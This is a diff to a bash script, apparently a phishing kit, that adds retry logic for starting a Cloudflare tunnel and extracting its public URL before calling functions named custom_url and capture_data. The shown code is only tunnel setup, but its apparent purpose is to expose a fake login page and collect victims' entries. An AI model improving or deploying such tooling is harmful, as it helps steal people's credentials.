@@ -364,7 +364,7 @@ capture_data() {
 
 ## Start Cloudflared
 start_cloudflared() { 
-	rm .cld.log > /dev/null 2>&1 &
+	rm .server/.cld.log > /dev/null 2>&1
 	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
@@ -376,8 +376,37 @@ start_cloudflared() {
 		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
 	fi
 
-	sleep 8
-	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
+	echo -ne "\n${RED}[${WHITE}-${RED}]${CYAN} Waiting for tunnel to establish..."
+	
+	# Wait and retry logic to extract cloudflare URL
+	max_attempts=15
+	attempt=0
+	cldflr_url=""
+	
+	while [[ -z "$cldflr_url" && $attempt -lt $max_attempts ]]; do
+		sleep 2
+		attempt=$((attempt + 1))
+		
+		# Try to extract URL from log file
+		if [[ -e ".server/.cld.log" ]]; then
+			cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log" | head -n1)
+		fi
+		
+		# Show progress indicator
+		if [[ -z "$cldflr_url" ]]; then
+			echo -n "."
+		fi
+	done
+	
+	# Check if URL was successfully extracted
+	if [[ -z "$cldflr_url" ]]; then
+		echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error: Unable to establish Cloudflare tunnel."
+		echo -e "${ORANGE}[${WHITE}*${ORANGE}]${ORANGE} Please check your internet connection and try again."
+		echo -e "${CYAN}[${WHITE}*${CYAN}]${CYAN} You can also try restarting the script.\n"
+		exit 1
+	fi
+	
+	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Tunnel established successfully!"
 	custom_url "$cldflr_url"
 	capture_data
 }
